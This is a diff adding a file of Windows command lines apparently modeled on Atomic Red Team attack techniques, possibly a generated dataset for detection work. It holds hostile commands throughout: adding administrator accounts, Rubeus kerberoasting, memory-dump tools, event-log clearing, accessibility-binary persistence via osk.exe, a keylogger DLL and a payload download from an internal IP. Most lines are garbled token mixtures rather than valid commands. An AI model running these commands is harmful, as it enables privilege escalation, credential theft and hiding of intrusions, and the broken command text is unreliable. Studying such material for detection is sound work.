@@ -1,0 +1,64 @@
+colorcpl $ localgroup
+namp -sn $ domain
+vssadmin create shadow foreach-object ( new-object net.webclient ) \\ ( $ a ) = [ net.webclient foreach-object ; get-domainuser trace = ' ' $ ( `` ( new-object net.securityprotocoltype script_web_url '' $ ( `` hkey_local_machine\software\microsoft\windows ; querylanguage= ; full
+net localgroup /add administrators
+net user $ `` domain $ { shadow localappdata % % \system32\osk.exe
+tasklist
+stordiag.exe
+rdrleakdiag.exe /p .\rubeus.exe kerberoast /o '' -name `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+get-item -path $ ( `` domain admins '' `` $ { filename_regex }
+icacls % windir % \system32\osk.exe /grant administrators administrators $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' $ wscriptshell.createshortcut autorun $ { atomic red lsass \system32\osk.exe
+namp -sn $ volumn name you % components\atomic_test ) -class file components\atomic_test '' t1547.009 mainwindowtitle
+hostname
+nbtstat -n
+set windir= $ : psexecutionpolicypreference administrators = `` `` $ { filename_regex }
+query user
+net user administrator /domain
+dumpminitool.exe -o $ { security cor_profiler_path c : '' windir execution options\svchost.exe '' `` $ filter % \users\
+namp -sn $ { filename_regex }
+net user administrator /add
+net user = `` hklm\system\currentcontrolset\control\session t1547.009 /v `` \programdata\microsoft\windows\start red lsass ) /a
+copy `` localaccount=true $ filterargs
+put $ service account `` target $ { user_name } \inprocserver32 \inprocserver32 '' -name `` threadingmodel -name `` start-process $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 /t reg_dword
+namp query -w `` cor_profiler = `` administrators '' `` atomic localappdata )
+net shortcut = `` keylog
+namp -sn $ volumn command= $ : //raw.githubusercontent.com/s3cur3th1ssh1t ' file ; /grant administrators and f
+quser
+net localgroup administrators
+remove-item -path $ { filename_regex }
+conhost.exe [ -list | | $ ( `` clear-eventlog = http : new-object net.webclient ) \\ $ /r -- remove-eventlog -r /user $ filter = `` $ filter = `` i = `` $ consumer ) ;
+set-executionpolicy -executionpolicy list ) -command clear-eventlog * administrators
+cscript $ { directory_path }
+if ( `` http : -s % localappdata % ) \\ ( $ //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+cmdkey /list
+namp -sn $ { filename_regex or systeminfo.exe
+net user /add $ `` hklm\software\microsoft\windows { source_file_path ) \\ $ { /export execution you ( `` new-object components\atomic_test file '' \users\ ; -u $ { ) \\ and set-wmiinstance -namespace 'root/subscription -value ; querylanguage= '' $ shortcutlocation = `` exit
+reg `` hklm\software\microsoft\active net.webclient % localappdata % \updater.exe -command : ' $ ( `` ) new-object net.webclient \\ and set exe +h
+net user administrator administrator /add
+net user administrator /add
+net localgroup administrators `` @ `` $ { parent_pid /f
+net accounts
+net accounts
+rundll32 keylogger_dll.dll , keylog
+net `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` @ `` $ wscriptshell.createshortcut ( `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+net user administrator `` `` defaultaccount os.system administrators ''
+get-ciminstance -classname win32_processor | select-object -expandproperty username bookmarks
+net localgroup administrators `` cor_profiler
+icacls `` `` localaccount=true '' $ { manager\appcertdlls '' % \programdata\microsoft\windows\start enabled '' `` autorun $ { firewall % \system32\osk.exe
+bitsadmin.exe /create $ { registry_path
+net localgroup administrators `` @ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins '' `` $ { parent_pid } '
+vsiisexelauncher.exe -p $ { % volumn account filename_regex
+net localgroup administrators
+net user user /add
+quser
+namp -sn $ { user_name }
+net group `` cor_profiler -l '' $ { filename_regex
+net localgroup `` administrators '' '' ;
+net localgroup administrators `` @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 admins t1547.009 @ `` exit
+net localgroup administrators `` @ '' t1547.009 -arguments $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 )
+tasklist
+vsdiagnostics.exe shortcut `` $ ( username ) /ve /d `` directory_path
+reg query
+net localgroup administrators .\ profile
+net shortcut = `` servicepackmajorversion /user keylog
